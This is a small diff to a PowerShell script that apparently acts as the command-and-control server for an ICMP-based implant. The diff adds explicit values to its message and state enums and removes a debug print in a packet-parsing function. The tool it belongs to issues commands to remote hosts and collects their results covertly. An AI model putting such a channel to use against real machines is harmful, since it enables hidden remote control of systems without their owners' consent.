@@ -1,23 +1,23 @@
 Import-Module ReadLineWithHistory;
 
 enum ImplantMessageType {
-	Prompt
-	NeedsInstruction
-	CommandResultPart
-	CommandResultEnd
+	Prompt = 0
+	NeedsInstruction = 1
+	CommandResultPart = 2
+	CommandResultEnd = 3
 }
 
 enum ServerMessageType {
-	NeedsPrompt
-	IssuingCommand
-	Stop
+	NeedsPrompt = 0
+	IssuingCommand = 1
+	Stop = 2
 }
 
 enum ServerState {
-	WaitingForPrompt
-	EnteringCommand
-	WaitingToReplyWithCommand
-	ReceivingCommandResult
+	WaitingForPrompt = 0
+	EnteringCommand = 1
+	WaitingToReplyWithCommand = 2
+	ReceivingCommandResult = 3
 }
 
 <#
@@ -102,7 +102,6 @@ public static class LIBC
 		[ImplantMessageType]$MessageType = $Buffer[$IPHeaderSize + 8];
 		$MessageData = if ($ByteCount -lt $IPHeaderSize + 9) { $null } else { $Buffer[($IPHeaderSize + 9)..($ByteCount - 1)] };
 
-		Write-Host "Header: $ICMPHeader, Type: $MessageType, Data: $Data, Endpoint: $Endpoint";
 		return ($ICMPHeader, $MessageType, $MessageData, $Endpoint);
 	}
 
